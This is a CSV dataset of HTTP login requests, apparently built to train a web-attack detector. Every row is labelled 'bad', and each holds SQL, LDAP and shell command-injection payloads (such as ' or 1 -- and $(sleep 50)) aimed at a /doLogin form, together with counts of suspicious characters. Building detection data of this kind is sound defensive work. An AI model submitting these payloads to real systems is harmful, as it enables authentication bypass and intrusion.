method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,b'/login.jsp',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=!&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%20$(sleep%2050)&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,1,2,1,bad
POST,b'/doLogin',"b""uid=%20'sleep%2050'&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",2,0,0,0,2,1,bad
POST,b'/doLogin',b'uid=%21&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%22&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,1,0,0,0,0,bad
POST,b'/doLogin',"b""uid=%22'%20or%201%20--'%22&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",2,2,1,0,3,0,bad
POST,b'/doLogin',b'uid=%22)%20or%20(%22a%22%3d%22a&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,4,0,1,2,0,bad
POST,b'/doLogin',b'uid=%23&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%26&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%26apos%3b%20OR&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',"b""uid=%26lt%3b%26gt%3b%26quot%3b'%%3b)(%26amp%3b%2b&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,1,0,0,bad
POST,b'/doLogin',b'uid=%28&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,1,0,0,bad
POST,b'/doLogin',b'uid=%29&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2A%28%7C%28mail%3D%2A%29%29&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%2A%28%7C%28objectclass%3D%2A%29%29&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%2A%7C&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2a%2f%2a&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2a%7c&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2a(%7c(mail%3d%2a))&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%2a(%7c(objectclass%3d%2a))&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%2f%2f%2a&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
